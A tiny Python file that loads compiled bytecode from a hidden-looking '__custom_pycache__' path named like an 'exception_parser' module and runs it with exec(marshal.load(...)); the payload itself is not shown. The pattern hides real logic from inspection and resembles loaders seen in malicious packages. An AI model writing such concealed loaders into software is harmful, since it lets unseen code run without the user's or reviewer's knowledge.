
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'exception_parser_911874b860ff450db80810526329a459.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
